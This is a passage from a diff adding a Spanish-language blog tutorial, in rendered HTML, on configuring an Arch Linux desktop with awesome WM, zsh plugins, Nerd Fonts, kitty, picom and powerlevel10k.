+&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; bin/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; ~/.local/bin/
+&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; misc/. ~/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Reiniciamos la máquina con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo reboot now&lt;/code&gt;. Al iniciar la máquina otra vez, al darle click en nuestro usuario, vemos un engrane en la parte inferior derecha, damos click y seleccionamos &lt;strong&gt;awesome&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/entorno_arch/arch4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nuestro entorno va a estar un poco raro; esto lo arreglamos ingresando a modo consola con &lt;strong&gt;Ctrl + Alt + F3&lt;/strong&gt;, nos logueamos, ingresamos a la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cd /Desktop/repos/dotfiles&lt;/code&gt; y ejecutamos un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git log&lt;/code&gt;; de las opciones que nos aparecen, la quinta nos dice &lt;strong&gt;fix: ui and widgets&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/entorno_arch/arch5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Podemos guardar el id asociado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;c1e2eef2baa91aebd37324891cb282666beae04f&lt;/code&gt;  y ejecutamos&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git checkout c1e2eef2baa91aebd37324891cb282666beae04f
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;O ejecutamos el comando siguiente&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git checkout &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;git log | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;commit | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;c1&quot;&lt;/span&gt;| &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'NR==3'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'NF{print $NF}'&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Volvemos a copiar los binarios y reiniciamos:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; config/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; ~/.config/
+&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; bin/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; ~/.local/bin/
+&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; misc/. ~/
+&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;reboot now
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;idioma-del-teclado&quot;&gt;Idioma del teclado&lt;/h3&gt;
+
+&lt;p&gt;Si iniciamos sessión, vemos que el teclado se encuentra en inglés y que al hacer &lt;strong&gt;Ctrl + Enter&lt;/strong&gt; no se nos abre la terminal, por lo tanto, hacemos otra vez &lt;strong&gt;Ctrl + Alt + F3&lt;/strong&gt;; nos logueamos en modo consola y editamos el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nano .config/awesome/rc.lua&lt;/code&gt; y en la parte donde nos dice &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;terminal&lt;/code&gt; le asignamos el valor de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kitty&lt;/code&gt;. Ahora, hacemos &lt;strong&gt;Ctrl + Alt + F2&lt;/strong&gt; y en pantalla completa, debemos hacer un &lt;strong&gt;Ctrl + Windows + R&lt;/strong&gt; para aplicar los cambios y ahora si hacemos &lt;strong&gt;Ctrl + Enter&lt;/strong&gt; ya se nos despliega la terminal.&lt;/p&gt;
+
+&lt;p&gt;Para cambiar el idioma del teclado, ejecutamos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;localectl set-x11-keymap es&lt;/code&gt; y al hacer &lt;strong&gt;Ctrl + Windows + Q&lt;/strong&gt;, nos deslogueamos y al iniciar sesión, ya tenemos el idioma español&lt;/p&gt;
+
+&lt;h3 id=&quot;instalación-zsh&quot;&gt;Instalación ZSH&lt;/h3&gt;
+
+&lt;p&gt;Instalamos la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zsh&lt;/code&gt; y le cambiamos a nuestro usuario y a &lt;strong&gt;root&lt;/strong&gt; la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bash&lt;/code&gt; por la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zsh&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;pacman &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; zsh
+&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;usermod &lt;span class=&quot;nt&quot;&gt;--shell&lt;/span&gt; /usr/bin/zsh k4miyo
+&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;usermod &lt;span class=&quot;nt&quot;&gt;--shell&lt;/span&gt; /usr/bin/zsh root
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora nos dirigimos a &lt;a href=&quot;https://s4vitar.github.io/bspwm-configuration-files/&quot;&gt;bspwm-configuration-files&lt;/a&gt;, borramos el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.zshrc&lt;/code&gt; y copiamos todo lo que se encuentra en el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zshrc&lt;/code&gt; de la págna para generar uno nuevo. Si abrimos una nueva terminal, vemos que nos aparecen unos errores de archivos que no se encuetran en el sistema, por lo tanto los instalmos:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;paru &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; zsh-syntax-highlighting zsh-autosuggestions
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Descargamos el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo.plugin.zsh&lt;/code&gt; en la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share/zsh/plugins/zsh-sudo/&lt;/code&gt;. En caso de no existir los directorios, los creamos:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /usr/share/zsh/plugins/
+&lt;span class=&quot;nb&quot;&gt;sudo mkdir &lt;/span&gt;zsh-sudo
+&lt;span class=&quot;nb&quot;&gt;chown &lt;/span&gt;k4miyo:k4miyo zsh-sudo/
+&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+wget https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/plugins/sudo/sudo.plugin.zsh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Y cambiamos la ruta de los archivos dentro de la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.zshrc&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;...
+&lt;span class=&quot;c&quot;&gt;# Plugins&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;source&lt;/span&gt; /usr/share/zsh/plugins/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh
+&lt;span class=&quot;nb&quot;&gt;source&lt;/span&gt; /usr/share/zsh/plugins/zsh-autosuggestions/zsh-autosuggestions.zsh
+&lt;span class=&quot;nb&quot;&gt;source&lt;/span&gt; /usr/share/zsh/plugins/zsh-sudo/sudo.plugin.zsh
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;instalación-de-locate-lsd-bat-y-scrub&quot;&gt;Instalación de locate, lsd, bat y scrub&lt;/h3&gt;
+
+&lt;p&gt;Ahora instalamos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;locate&lt;/code&gt;,&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lsd&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bat&lt;/code&gt; con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo pacman -S locate lsd bat&lt;/code&gt;; así como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scrub&lt;/code&gt; con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;paru -S scrub&lt;/code&gt;. Para que el usuario &lt;strong&gt;root&lt;/strong&gt; tenga la misma presentación, vamos a crear un link simbólico de nuestra &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.zshrc&lt;/code&gt; con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo ln -s -f /home/k4miyo/.zshrc /root/.zshrc&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;nerd-fonts&quot;&gt;Nerd Fonts&lt;/h3&gt;
+
+&lt;p&gt;Cambiaremos la fuente de nuestra termina descargando &lt;a href=&quot;https://github.com/ryanoasis/nerd-fonts/releases/download/v2.1.0/Hack.zip&quot;&gt;Hack.zip&lt;/a&gt; y su contenido lo colocamos en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share/fonts&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /usr/share/fonts
+&lt;span class=&quot;nb&quot;&gt;sudo mv&lt;/span&gt; /home/k4miyo/Downloads/Hack.zip &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;unzip Hack.zip
+&lt;span class=&quot;nb&quot;&gt;sudo rm &lt;/span&gt;Hack.zip
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;configuración-kitty&quot;&gt;Configuración kitty&lt;/h3&gt;
+
+&lt;p&gt;Vamos a retocar un poco la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kitty&lt;/code&gt;, por lo que vamos descargarnos el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kitty.conf&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ~/.config/kitty/
+wget https://raw.githubusercontent.com/rxyhn/bspdots/main/config/kitty/kitty.conf
+wget https://raw.githubusercontent.com/rxyhn/bspdots/main/config/kitty/color.ini
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Y ahora vamos a retocar el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kitty.conf&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;enable_audio_bell no
+
+include color.ini
+
+font_family		HackNerdFonts
+font_size 12
+
+url_color	&lt;span class=&quot;c&quot;&gt;#61afef&lt;/span&gt;
+
+url_style	curly
+
+map ctrl+left neighboring_window left
+map ctrl+right neighboring_window right
+map ctrl+up neighboring_window up
+map ctrl+down neighboring_window down
+
+map f1 copy_to_buffer a
+map f2 paste_from_buffer a
+map f3 copy_to_buffer b
+map f4 paste_from_buffer b
+
+cursor_shape beam
+cursor_beam_thickness 1.8
+
+mouse_hide_wait 3.0
+detect_urls &lt;span class=&quot;nb&quot;&gt;yes
+
+&lt;/span&gt;repaint_delay 10
+input_delay 3
+sync_to_monitor &lt;span class=&quot;nb&quot;&gt;yes
+
+&lt;/span&gt;map ctrl+shift+z toggle_layout stack
+tab_bar_style powerline
+
+inactive_tab_background &lt;span class=&quot;c&quot;&gt;#e06c75&lt;/span&gt;
+active_tab_background &lt;span class=&quot;c&quot;&gt;#98c379&lt;/span&gt;
+inactive_tab_foreground &lt;span class=&quot;c&quot;&gt;#000000&lt;/span&gt;
+tab_bar_margin_color black
+
+map ctrl+shift+enter new_window_with_cwd
+map ctrl+shift+t new_window_with_cwd
+
+brackground_opacity 0.95
+
+shell zsh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Con esta configuración, podemos hacer lo siguiente:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Ctrl + Shift + Enter&lt;/strong&gt; - Abrir terminal secundaria&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Ctrl + Shift + w&lt;/strong&gt; - Cerrar terminal secundaria&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Ctrl + Shift + r&lt;/strong&gt; - Resize&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Ctrl + Shift + l&lt;/strong&gt; - Acomodar ventanas&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Ctrl + Shift + Alt + t&lt;/strong&gt; - Nombre de ventana&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Ctrl + Shift + t&lt;/strong&gt; - Crear más ventanas&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;configuración-awesome&quot;&gt;Configuración Awesome&lt;/h3&gt;
+
+&lt;p&gt;Ahora retocremos el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;~/.config/awesome/ui/decorations/init.lua&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ~/.config/awesome/ui/decorations
+nano init.lua
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Y comentaremos las últimas dos lineas con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; require&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ui.decorations.titlebar&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; require&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ui.decorations.music&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Para la transparencia de la terminal, vamos a borrar el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;~/.config/awesome/theme/picom.conf&lt;/code&gt; y vamos a sustituirlo por lo que se encuentra en el siguiente repositorio:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ~/.config/awesome/theme/
+&lt;span class=&quot;nb&quot;&gt;rm &lt;/span&gt;picom.conf
+wget https://raw.githubusercontent.com/rxyhn/bspdots/main/config/picom/picom.conf
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora vammos a realizar unas modificaciones, por lo que nos abrimos el archivo y cambiamos lo siguiente:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;##############################################################################&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#                                  CORNERS                                   #&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;##############################################################################&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# requires: https://github.com/sdhand/compton&lt;/span&gt;
+corner-radius &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 20&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+rounded-corners-exclude &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;
+  &lt;span class=&quot;c&quot;&gt;#&quot;window_type = 'normal'&quot;,&lt;/span&gt;
+  &lt;span class=&quot;c&quot;&gt;#&quot;class_g = 'firefox'&quot;,&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+round-borders &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 20&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+round-borders-exclude &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;
+  &lt;span class=&quot;c&quot;&gt;#&quot;class_g = 'TelegramDesktop'&quot;,&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+...
+
+&lt;span class=&quot;c&quot;&gt;# Enable/disable VSync.&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# vsync = false&lt;/span&gt;
+vsync &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;
+
+...
+
+&lt;span class=&quot;c&quot;&gt;# Default opacity for dropdown menus and popup menus. (0.0 - 1.0, defaults to 1.0)&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# menu-opacity = 1.0&lt;/span&gt;
+opacity &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1.0
+
+...
+
+&lt;span class=&quot;c&quot;&gt;##############################################################################&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#                                    BLUR                                    #&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;##############################################################################&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# Parameters for background blurring, see the *BLUR* section for more information.&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# blur-method = &quot;gaussian&quot;&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# blur-size = 14&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# blur-strength = 10&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# Blur background of semi-transparent / ARGB windows.&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# Bad in performance, with driver-dependent behavior.&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# The name of the switch may change without prior notifications.&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# blur-background = false&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# Blur background of windows when the window frame is not opaque.&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# Implies:&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#    blur-background&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# Bad in performance, with driver-dependent behavior. The name may change.&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# blur-background-frame = false&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# Use fixed blur strength rather than adjusting according to window opacity.&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# blur-background-fixed = false&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# Specify the blur convolution kernel, with the following format:&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# example:&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#   blur-kern = &quot;5,5,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1&quot;;&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# blur-kern = ''&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# blur-kern = &quot;3x3box&quot;;&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# Exclude conditions for background blur.&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# blur-background-exclude = []&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# blur-background-exclude = [&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#     &quot;! name~=''&quot;,&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#     &quot;name *= 'slop'&quot;,&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#     &quot;window_type = 'dock'&quot;,&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#     &quot;window_type = 'desktop'&quot;,&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#     &quot;_GTK_FRAME_EXTENTS@:c&quot;&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# ];&lt;/span&gt;
+
+...
+
+&lt;span class=&quot;c&quot;&gt;# Disable the use of damage information.&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# This cause the whole screen to be redrawn everytime, instead of the part of the screen&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# has actually changed. Potentially degrades the performance, but might fix some artifacts.&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# The opposing option is use-damage&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# &lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# no-use-damage = false&lt;/span&gt;
+use-damage &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;
+
+...
+
+&lt;span class=&quot;c&quot;&gt;# Specify refresh rate of the screen. If not specified or 0, picom will&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# try detecting this with X RandR extension.&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# &lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# refresh-rate = 60&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# refresh-rate = 0&lt;/span&gt;
+
+...
+&lt;span class=&quot;c&quot;&gt;# Specify the backend to use: `xrender`, `glx`, or `xr_glx_hybrid`. &lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# `xrender` is the default one.&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# backend = 'glx'&lt;/span&gt;
+backend &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;xrender&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;fondo-de-pantalla&quot;&gt;Fondo de pantalla&lt;/h3&gt;
+
+&lt;p&gt;Para modificar el fondo de pantalla, primero nos descargamos la imagen que queramos para el fondo y agregamos la siguiente linea en el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;~/.config/awesome/rc.lua&lt;/code&gt;. Adicional, nos descargaremos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;feh&lt;/code&gt; con el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;paru -S feh&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; Wallpaper
+&lt;span class=&quot;nb&quot;&gt;local &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;wallpaper_cmd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;feh --bg-fill /home/k4miyo/Desktop/k4miyo/images/Wallpaper.jpg&quot;&lt;/span&gt;
+os.execute&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;wallpaper_cmd&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;powerlevel10k&quot;&gt;PowerLevel10k&lt;/h3&gt;
+
+&lt;p&gt;Ya toma instalarse la &lt;strong&gt;powerlevel10k&lt;/strong&gt;; por lo tanto nos dirigimos al repositorio &lt;a href=&quot;https://github.com/romkatv/powerlevel10k&quot;&gt;powerlevel10k&lt;/a&gt; y seguimos las intrucciónes de instalación; tanto para el usuario normal y &lt;strong&gt;root&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cd
+&lt;/span&gt;git clone &lt;span class=&quot;nt&quot;&gt;--depth&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 https://github.com/romkatv/powerlevel10k.git ~/powerlevel10k
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'source ~/powerlevel10k/powerlevel10k.zsh-theme'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;~/.zshrc
+zsh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Para el usuario no privilegiado, modificaremos parte de la configuración de la &lt;strong&gt;powerlevel10k&lt;/strong&gt; en el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;~/.p10k.zsh&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# The list of segments shown on the left. Fill it with the most important segments.&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;typeset&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;POWERLEVEL9K_LEFT_PROMPT_ELEMENTS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=(&lt;/span&gt;
+    os_icon                 &lt;span class=&quot;c&quot;&gt;# os identifier&lt;/span&gt;
+    &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt;                     &lt;span class=&quot;c&quot;&gt;# current directory&lt;/span&gt;
+    vcs                     &lt;span class=&quot;c&quot;&gt;# git status&lt;/span&gt;
+    command_execution_time 
+    context
+    &lt;span class=&quot;c&quot;&gt;# prompt_char           # prompt symbol&lt;/span&gt;
